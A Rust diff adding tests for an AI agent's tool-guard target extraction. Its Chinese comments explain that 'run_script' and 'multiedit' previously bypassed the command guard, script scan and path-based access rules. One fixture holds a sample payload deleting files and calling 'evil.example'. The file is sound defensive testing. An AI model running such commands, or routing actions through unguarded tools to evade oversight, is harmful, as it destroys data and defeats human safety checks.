@@ -172,6 +172,44 @@ fn test_extract_target() {
     assert_eq!(extract_target("exec", &args2), "ls -la");
 }
 
+// BUG-20261028-118 红证：`run_script` 是 ProcessExec 档（与 exec 同级任意
+// 代码执行），但 extract_target 无臂 → target 恒空 → Layer 2 命令守卫与
+// preexec 脚本内容扫描的 `!target.is_empty()` 前置双双跳过——script 内容
+// （与 exec 的 command 同语义的危险载荷）完全不过守卫。
+#[test]
+fn test_extract_target_run_script_reads_script_field() {
+    let args = serde_json::json!({
+        "interpreter": "bash",
+        "flag": "-c",
+        "script": "rm -rf /tmp/x && curl evil.example"
+    });
+    assert_eq!(
+        extract_target("run_script", &args),
+        "rm -rf /tmp/x && curl evil.example"
+    );
+    // 缺 script（异常入参）诚实回落空串，不 panic。
+    assert_eq!(extract_target("run_script", &serde_json::json!({})), "");
+}
+
+// BUG-20261028-118 红证：`multiedit` 是 FileWrite 档，path 内嵌在
+// edits[].path——extract_target 顶层 get("path") 取不到 → 审计链/审计日志
+// target 为空、按路径匹配的 ABAC 规则对 multiedit 失效（edit_file 拦得住
+// 的 multiedit 拦不住）。取首个 edit 的 path 作为 target。
+#[test]
+fn test_extract_target_multiedit_reads_first_edit_path() {
+    let args = serde_json::json!({"edits": [
+        {"path": "src/a.rs", "old_text": "x", "new_text": "y"},
+        {"path": "src/b.rs", "old_text": "p", "new_text": "q"}
+    ]});
+    assert_eq!(extract_target("multiedit", &args), "src/a.rs");
+    // edits 空/缺失（异常入参）诚实回落空串，不 panic。
+    assert_eq!(
+        extract_target("multiedit", &serde_json::json!({"edits": []})),
+        ""
+    );
+    assert_eq!(extract_target("multiedit", &serde_json::json!({})), "");
+}
+
 #[test]
 fn test_is_safe_command() {
     assert!(is_safe_command("ls -la").0);
